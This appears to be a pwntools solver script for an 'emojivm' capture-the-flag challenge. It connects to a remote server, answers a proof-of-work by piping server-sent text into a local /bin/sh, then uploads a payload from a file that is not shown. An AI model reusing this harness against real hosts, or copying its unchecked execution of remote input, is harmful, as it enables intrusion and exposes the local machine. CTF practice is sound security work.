from pwn import *
context.log_level = 'debug'

TARGET = './emojivm'
HOST = '3.115.122.69'
PORT = 30261

# r = process([TARGET, "HOGE"])
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

elf = ELF(TARGET)


def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('token:\n')
s = r.recvuntil('\n')[:-1]

sh = process('/bin/sh')
sh.sendline(s) 
res = sh.recv().split('token: ')[1][:-1]
sh.close()

r.sendline(res)
r.sendlineafter('( MAX: 2000 bytes )', '786')
emo = open('HOGE').readline()
r.sendafter('file:', emo[:-1])


r.interactive()
r.close()
